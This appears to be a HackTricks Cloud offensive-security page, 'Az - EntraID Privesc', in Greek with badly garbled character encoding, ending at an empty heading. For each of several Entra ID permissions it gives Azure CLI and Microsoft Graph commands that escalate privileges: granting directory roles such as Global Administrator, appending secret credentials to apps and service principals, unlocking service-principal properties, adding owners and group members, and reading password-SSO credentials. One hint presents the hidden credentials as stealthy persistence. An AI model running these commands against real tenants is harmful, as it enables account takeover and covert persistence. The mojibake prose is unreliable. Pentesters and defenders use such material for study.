# Az - EntraID Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="info" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ **ÏŒÏ‡Î¹ ÏŒÎ»ÎµÏ‚ Î¿Î¹ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¯Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚** Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î¿Î¹ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î¿Î¹ ÏÏŒÎ»Î¿Î¹ ÏƒÏ„Î¿ Entra ID **ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¹Î»Î­Î¾Î¹Î¼ÎµÏ‚ Î³Î¹Î± Ï‡ÏÎ®ÏƒÎ· ÏƒÎµ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿Ï…Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚.**
{% endhint %}

## Î¡ÏŒÎ»Î¿Î¹

### Î¡ÏŒÎ»Î¿Ï‚: Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ Î¡ÏŒÎ»Ï‰Î½ Î¼Îµ Î ÏÎ¿Î½Î¿Î¼Î¯Î± <a href="#c9d4cde0-7dcc-45d5-aa95-59d198ae84b2" id="c9d4cde0-7dcc-45d5-aa95-59d198ae84b2"></a>

Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÏÏŒÎ»Î¿Ï‚ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¹Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¯Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î³Î¹Î± Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±Î¸Î­Ï„ÎµÎ¹ ÏÏŒÎ»Î¿Ï…Ï‚ ÏƒÎµ ÎºÏÏÎ¹Î¿Ï…Ï‚ ÎºÎ±Î¹ Î½Î± Î´Î¯Î½ÎµÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÏƒÎµ ÏÏŒÎ»Î¿Ï…Ï‚. ÎšÎ±Î¹ Î¿Î¹ Î´ÏÎ¿ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„Î¿ÏÎ½ Î³Î¹Î± Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏ‰Î¸Î¿ÏÎ½ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±.

* Î‘Î½Î¬Î¸ÎµÏƒÎ· ÏÏŒÎ»Î¿Ï… ÏƒÎµ Ï‡ÏÎ®ÏƒÏ„Î·:
```bash
# List enabled built-in roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directoryRoles"

# Give role (Global Administrator?) to a user
roleId="<roleId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"
```
* Î ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ ÏƒÎµ Î­Î½Î±Î½ ÏÏŒÎ»Î¿:
```bash
# List only custom roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# Change the permissions of a custom role
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/<role-id>" \
--headers "Content-Type=application/json" \
--body '{
"description": "Update basic properties of application registrations",
"rolePermissions": [
{
"allowedResourceActions": [
"microsoft.directory/applications/credentials/update"
]
}
]
}'
```
## Î•Ï†Î±ÏÎ¼Î¿Î³Î­Ï‚

### `microsoft.directory/applications/credentials/update`

Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±** (ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î® Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÎ¬) ÏƒÎµ Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎµÏ‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚. Î•Î¬Î½ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î­Ï‡ÎµÎ¹ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÎ­Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Ï‰Ï‚ Î±Ï…Ï„Î® Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎºÎ±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Î±Ï…Ï„Î¬ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±.
```bash
# Generate a new password without overwritting old ones
az ad app credential reset --id <appId> --append
# Generate a new certificate without overwritting old ones
az ad app credential reset --id <appId> --create-cert
```
### `microsoft.directory/applications.myOrganization/credentials/update`

Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `applications/credentials/update`, Î±Î»Î»Î¬ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Î¼Î¯Î±Ï‚ Î¼ÏŒÎ½Î¿ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚.
```bash
az ad app credential reset --id <appId> --append
```
### `microsoft.directory/applications/owners/update`

**Î ÎµÏÎ¹Î³ÏÎ±Ï†Î®**: Î•Î½Î·Î¼Î­ÏÏ‰ÏƒÎ· Î¹Î´Î¹Î¿ÎºÏ„Î·Ï„ÏÎ½ ÎµÏ†Î±ÏÎ¼Î¿Î³ÏÎ½\
**Î”Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ·Ï‚**: Î ÏÎ¿ÏƒÎ¸Î­Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ Ï„Î¿Ï…Ï‚ Ï‰Ï‚ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î·, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®, ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Ï‰Î½ Ï„Ï‰Î½ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ ÎºÎ±Î¹ Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½.
```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append

# You can check the owners with
az ad app owner list --id <appId>
```
## Service Principals

### `microsoft.directory/servicePrincipals/credentials/update`

Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± ÏƒÎµ Ï…Ï€Î¬ÏÏ‡Î¿Î½Ï„ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¹Î±ÎºÎ¿ÏÏ‚ ÎºÏÏÎ¹Î¿Ï…Ï‚. Î•Î¬Î½ Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¹Î±ÎºÏŒÏ‚ ÎºÏÏÎ¹Î¿Ï‚ Î­Ï‡ÎµÎ¹ Î±Î½Ï…ÏˆÏ‰Î¼Î­Î½Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±Î»Î¬Î²ÎµÎ¹ Î±Ï…Ï„Î¬ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±.
```bash
az ad sp credential reset --id <sp-id> --append
```
{% hint style="danger" %}
ÎŸ Î½Î­Î¿Ï‚ ÎºÏ‰Î´Î¹ÎºÏŒÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î´ÎµÎ½ Î¸Î± ÎµÎ¼Ï†Î±Î½Î¹ÏƒÏ„ÎµÎ¯ ÏƒÏ„Î·Î½ ÎºÎ¿Î½ÏƒÏŒÎ»Î± Î¹ÏƒÏ„Î¿Ï, Î¿Ï€ÏŒÏ„Îµ Î±Ï…Ï„ÏŒ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ ÎºÏÏ…Ï†ÏŒÏ‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Î´Î¹Î±Ï„Î·ÏÎ®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÏ€Î¹Î¼Î¿Î½Î® ÏƒÎµ Î­Î½Î±Î½ Ï…Ï€Î·ÏÎµÏƒÎ¹Î±ÎºÏŒ ÎºÏÏÎ¹Î¿.\
Î‘Ï€ÏŒ Ï„Î¿ API Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ Î¼Îµ: `az ad sp list --query '[?length(keyCredentials) > 0 || length(passwordCredentials) > 0].[displayName, appId, keyCredentials, passwordCredentials]' -o json`
{% endhint %}

Î‘Î½ Î»Î¬Î²ÎµÏ„Îµ Ï„Î¿ ÏƒÏ†Î¬Î»Î¼Î± `"code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid."` ÎµÎ¯Î½Î±Î¹ ÎµÏ€ÎµÎ¹Î´Î® **Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î·Ï‚ Î¹Î´Î¹ÏŒÏ„Î·Ï„Î±Ï‚ passwordCredentials** Ï„Î¿Ï… SP ÎºÎ±Î¹ Ï€ÏÏÏ„Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„Î¿ Î¾ÎµÎºÎ»ÎµÎ¹Î´ÏÏƒÎµÏ„Îµ. Î“Î¹Î± Î±Ï…Ï„ÏŒ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ Î¼Î¹Î± Î¬Î´ÎµÎ¹Î± (`microsoft.directory/applications/allProperties/update`) Ï€Î¿Ï… ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ:

{% code overflow="wrap" %}
```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```
{% endcode %}

### `microsoft.directory/servicePrincipals/synchronizationCredentials/manage`

Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± ÏƒÎµ Ï…Ï€Î¬ÏÏ‡Î¿Î½Ï„ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¹Î±ÎºÎ¿ÏÏ‚ ÎºÏÏÎ¹Î¿Ï…Ï‚. Î•Î¬Î½ Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¹Î±ÎºÏŒÏ‚ ÎºÏÏÎ¹Î¿Ï‚ Î­Ï‡ÎµÎ¹ Î±Î½Ï…ÏˆÏ‰Î¼Î­Î½Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±Î»Î¬Î²ÎµÎ¹ Î±Ï…Ï„Î¬ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±.
```bash
az ad sp credential reset --id <sp-id> --append
```
### `microsoft.directory/servicePrincipals/owners/update`

Î Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î¹Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚, Î· ÎºÎ±Ï„Î¿Ï‡Î® ÎµÎ½ÏŒÏ‚ service principal ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï„Ï‰Î½ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ ÎºÎ±Î¹ Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Ï„Î¿Ï….
```bash
# Add new owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"

az ad sp credential reset --id <sp-id> --append

# You can check the owners with
az ad sp owner list --id <spId>
```
{% hint style="danger" %}
Î‘Ï†Î¿Ï Ï€ÏÏŒÏƒÎ¸ÎµÏƒÎ± Î­Î½Î±Î½ Î½Î­Î¿ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î·, Ï€ÏÎ¿ÏƒÏ€Î¬Î¸Î·ÏƒÎ± Î½Î± Ï„Î¿Î½ Î±Ï†Î±Î¹ÏÎ­ÏƒÏ‰ Î±Î»Î»Î¬ Î· API Î±Ï€Î¬Î½Ï„Î·ÏƒÎµ ÏŒÏ„Î¹ Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ DELETE Î´ÎµÎ½ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÏ„Î±Î¹, Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Î½ ÎµÎ¯Î½Î±Î¹ Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Î½Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÎ¹Ï‚ Ï„Î¿Î½ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î·. ÎˆÏ„ÏƒÎ¹, **Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï‚ Î½Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÎ¹Ï‚ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„ÎµÏ‚ ÏƒÎ®Î¼ÎµÏÎ±**.
{% endhint %}

### `microsoft.directory/servicePrincipals/disable` ÎºÎ±Î¹ `enable`

Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Î¬Î´ÎµÎ¹ÎµÏ‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Ï„Î·Î½ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎºÎ±Î¹ Ï„Î·Î½ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï…Ï€Î·ÏÎµÏƒÎ¹Î±ÎºÏÎ½ Ï€ÏÎ¹Î³ÎºÎ¯Ï€Ï‰Î½. ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î±Ï…Ï„Î® Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î³Î¹Î± Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î­Î½Î±Î½ Ï…Ï€Î·ÏÎµÏƒÎ¹Î±ÎºÏŒ Ï€ÏÎ¯Î³ÎºÎ¹Ï€Î± ÏƒÏ„Î¿Î½ Î¿Ï€Î¿Î¯Î¿ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¼Îµ ÎºÎ¬Ï€Î¿Î¹Î¿ Ï„ÏÏŒÏ€Î¿ Î³Î¹Î± Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎµÎ¹ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±.

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î³Î¹Î± Î±Ï…Ï„Î® Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ®, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Î±Î½Î±Î»Î¬Î²ÎµÎ¹ Ï„Î¿Î½ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¹Î±ÎºÏŒ Ï€ÏÎ¯Î³ÎºÎ¹Ï€Î±.
```bash
bashCopy code# Disable
az ad sp update --id <ServicePrincipalId> --account-enabled false

# Enable
az ad sp update --id <ServicePrincipalId> --account-enabled true
```
#### `microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials` & `microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials`

Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Î¬Î´ÎµÎ¹ÎµÏ‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎºÎ±Î¹ Ï„Î·Î½ Î±Ï€ÏŒÎºÏ„Î·ÏƒÎ· Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ Î³Î¹Î± single sign-on, Ï„Î± Î¿Ï€Î¿Î¯Î± Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Ï„ÏÎ¯Ï„Ï‰Î½.

{% code overflow="wrap" %}
```bash
# Generate SSO creds for a user or a group
spID="<spId>"
user_or_group_id="<id>"
username="<username>"
password="<password>"
az rest --method POST \
--uri "https://graph.microsoft.com/beta/servicePrincipals/$spID/createPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$user_or_group_id\", \"credentials\": [{\"fieldId\": \"param_username\", \"value\": \"$username\", \"type\": \"username\"}, {\"fieldId\": \"param_password\", \"value\": \"$password\", \"type\": \"password\"}]}"


# Get credentials of a specific credID
credID="<credID>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$credID/getPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$credID\"}"
```
{% endcode %}

***

## ÎŸÎ¼Î¬Î´ÎµÏ‚

### `microsoft.directory/groups/allProperties/update`

Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ· Ï‡ÏÎ·ÏƒÏ„ÏÎ½ ÏƒÎµ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡ÎµÏ‚ Î¿Î¼Î¬Î´ÎµÏ‚, Î¿Î´Î·Î³ÏÎ½Ï„Î±Ï‚ ÏƒÎµ ÎºÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
**Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·**: Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÎ¾Î±Î¹ÏÎµÎ¯ Ï„Î¹Ï‚ Î¿Î¼Î¬Î´ÎµÏ‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Î½Î±Ï„ÎµÎ¸Î¿ÏÎ½ ÏÏŒÎ»Î¿Î¹ Entra ID.

### `microsoft.directory/groups/owners/update`

Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î¯Î½ÎµÏ„Îµ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î·Ï‚ Î¿Î¼Î¬Î´Ï‰Î½. ÎˆÎ½Î±Ï‚ Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï„Î· ÏƒÏ…Î¼Î¼ÎµÏ„Î¿Ï‡Î® ÎºÎ±Î¹ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚, ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î±Ï…Î¾Î¬Î½Î¿Î½Ï„Î±Ï‚ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÏƒÏ„Î·Î½ Î¿Î¼Î¬Î´Î±.
```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```
**Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·**: Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÎ¾Î±Î¹ÏÎµÎ¯ Ï„Î¹Ï‚ Î¿Î¼Î¬Î´ÎµÏ‚ ÏÏŒÎ»Ï‰Î½ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Î½Î±Ï„ÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î¿ Entra ID.

### `microsoft.directory/groups/members/update`

Î‘Ï…Ï„Î® Î· Î¬Î´ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ· Î¼ÎµÎ»ÏÎ½ ÏƒÎµ Î¼Î¹Î± Î¿Î¼Î¬Î´Î±. ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Ï„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ Ï„Î¿Ï… Î® ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï…Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ ÏƒÎµ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡ÎµÏ‚ Î¿Î¼Î¬Î´ÎµÏ‚, Î³ÎµÎ³Î¿Î½ÏŒÏ‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ®ÏƒÎµÎ¹ Î±Ï…Î¾Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
### `microsoft.directory/groups/dynamicMembershipRule/update`

